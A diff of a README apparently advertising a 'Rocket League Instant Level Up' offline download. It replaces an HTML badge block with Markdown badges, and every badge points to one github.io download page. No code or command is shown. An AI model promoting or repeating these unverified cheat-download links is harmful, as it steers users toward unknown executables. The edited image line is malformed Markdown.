@@ -2,19 +2,15 @@
 
 [![Download Instant Level Up](https://img.shields.io/badge/Download-Instant_Level_Up-blueviolet)](https://rocket-league-instant-level-up-offline.github.io/.github)
 
-![Rocket League Offline Setup](https://i.imgur.com/VY7Pvfs.jpg)
+![Rocket League Offline Setup]([https://i.imgur.com/VY7Pvfs.jpg](https://us-west-2-epicgames.graphassets.com/A0Gpf4ZpfQzaTePr3NRc1z/resize=fit:clip,height:720,width:1280/output=format:webp/5oPZyiFQ3qmS83SjK8Ku))
 
-<p align="center">
-  <a href="[https://example.com/your-download-link](https://rocket-league-instant-level-up-offline.github.io/.github)">
-    <img src="https://img.shields.io/badge/Download-Combat_Guide-orange?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Platform-PC_Offline-blue?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Last_Update-June_2025-brightgreen?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Type-Instant_Level_Up-purple?style=for-the-badge">
-    <img src="https://img.shields.io/badge/OS-Windows_|_Linux_|_Console-lightgrey?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Fan_Guide-Included-informational?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Discord-Invalid-red?style=for-the-badge&logo=discord">
-  </a>
-</p>
+[![Download Combat Guide](https://img.shields.io/badge/Download-Combat_Guide-blueviolet)](https://rocket-league-instant-level-up-offline.github.io/.github)  
+[![Platform](https://img.shields.io/badge/Platform-Multi_Platform-informational)](https://rocket-league-instant-level-up-offline.github.io/.github)  
+[![Last Update](https://img.shields.io/badge/Last_Update-June_2025-yellow)](https://rocket-league-instant-level-up-offline.github.io/.github)  
+[![Type](https://img.shields.io/badge/Type-Fan_Guide-orange)](https://rocket-league-instant-level-up-offline.github.io/.github)  
+[![Windows | Linux | Console](https://img.shields.io/badge/OS-Windows_|_Linux_|_Console-brightgreen)](https://rocket-league-instant-level-up-offline.github.io/.github)  
+[![Fan Guide](https://img.shields.io/badge/Fan_Guide-Available-lightgrey)](https://rocket-league-instant-level-up-offline.github.io/.github)  
+[![Discord invalid](https://img.shields.io/badge/Discord-Link_Invalid-critical)](https://rocket-league-instant-level-up-offline.github.io/.github)
 
 ---
 
